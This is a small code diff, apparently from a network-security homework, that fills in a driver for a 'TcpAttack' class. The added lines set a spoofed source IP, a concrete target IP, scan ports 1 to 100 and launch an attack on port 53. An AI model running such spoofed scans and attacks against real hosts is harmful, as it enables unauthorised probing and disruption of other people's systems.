@@ -2,12 +2,12 @@
 
 from Karakashev_hw08 import *
 
-spoofIP='';
-targetIP='';
-rangeStart=0;#number
-rangeEnd=0;#number
-port=0;#number
+spoofIP='123.123.213.213';
+targetIP='199.168.74.118';
+rangeStart=1;#number
+rangeEnd=100;#number
+port=53;#number
 Tcp = TcpAttack(spoofIP,targetIP)
-TcpAttack.scanTarge(rangeStart,rangeEnd)
+Tcp.scanTarge(rangeStart,rangeEnd)
 if (Tcp.attackTarget(port)):
     print("Por was open to attacks")
